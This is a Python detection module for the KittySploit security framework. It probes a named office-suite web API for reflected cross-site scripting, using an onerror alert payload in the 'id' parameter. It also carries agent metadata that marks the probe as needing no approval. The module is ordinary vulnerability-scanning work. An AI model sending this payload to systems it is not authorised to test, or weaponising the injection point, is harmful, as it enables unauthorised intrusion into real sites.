#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Office Suite is suffering from an XSS vulnerability in the following parameter /api?path=files&id."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Office Suite Premium < 10.9.1.42602 - Cross-Site Scripting Detection',
        'description': 'Office Suite is suffering from an XSS vulnerability in the following parameter /api?path=files&id. Attackers often initiate an XSS attack by sending a malicious link to a user and enticing the user to click it.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'xss', 'office', 'suite', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': ['https://www.exploitalert.com/view-details.html?id=39632'],
    }

    def run(self):
        r = self.http_request(method="GET", path='/api?path=files&id=dfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi&revision=%22%22&type=%22thumb%22&command=url&expires=1687785968527', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('<img src=a onerror=alert(document.domain)>', ':')
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Office Suite Premium < 10.9.1.42602 - Cross-Site Scripting detected",
                path='/api?path=files&id=dfsse%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ez1668cyj2pi&revision=%22%22&type=%22thumb%22&command=url&expires=1687785968527',
            )
            return True
        return False

